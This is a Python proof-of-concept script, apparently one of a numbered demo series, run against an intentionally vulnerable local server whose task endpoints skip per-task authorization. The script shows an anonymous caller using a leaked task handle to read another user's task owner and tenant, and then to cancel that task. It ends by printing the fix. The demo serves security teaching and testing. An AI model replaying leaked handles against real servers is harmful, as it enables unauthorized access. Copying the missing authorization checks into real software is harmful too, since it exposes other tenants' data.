#!/usr/bin/env python3
"""PoC 1: an assumed leaked handle enables unauthorized metadata access.

This intentionally vulnerable server omits the per-task access checks required
by the Tasks extension. A session was never a substitute for authorization.
Run automatically: python3 demo.py 1
"""
from common import check_server, client_for, demo_args, expect, line, run_demo, task_from


def main():
    args = demo_args(__doc__)
    check_server(args)
    call = client_for(args)
    print("Alice starts a task on one local server using a synthetic credential.")
    task = task_from(call("tools/call", {
        "name": "generate_report", "arguments": {"amount": 500, "note": "simulated payroll"},
    }, token="tok-alice"))
    handle = task["taskId"]
    print(f"  task handle: {handle}")
    line()
    print("Assume that handle leaked. The demo passes it directly to the attacker.")
    print("The attacker uses the same instance, with no authentication token.")
    peek = task_from(call("tasks/get", {"taskId": handle}))
    expect(peek.get("owner") == "alice" and peek.get("tenant") == "acme",
           "The anonymous request did not disclose Alice's task metadata")
    ack = call("tasks/cancel", {"taskId": handle})
    expect(ack.get("ack") is True, "The anonymous cancellation request was not acknowledged")
    after = task_from(call("tasks/get", {"taskId": handle}))
    expect(after.get("status") == "cancelled", "The demo did not change the reported task status")
    print(f"  anonymous tasks/get: owner={peek['owner']} tenant={peek['tenant']}")
    print(f"  cancellation acknowledged: {ack['ack']}; reported status: {after['status']}")
    line()
    print("Observed: unauthorized metadata access and cancellation request.")
    print("This does not prove that execution stopped. PoC 5 checks the consequence.")
    print("FIX: authenticate the caller, then authorize the task, tenant, and operation.")
    print("     Client metadata is not identity. Redact bearer handles from production logs.")


if __name__ == "__main__":
    run_demo(main)
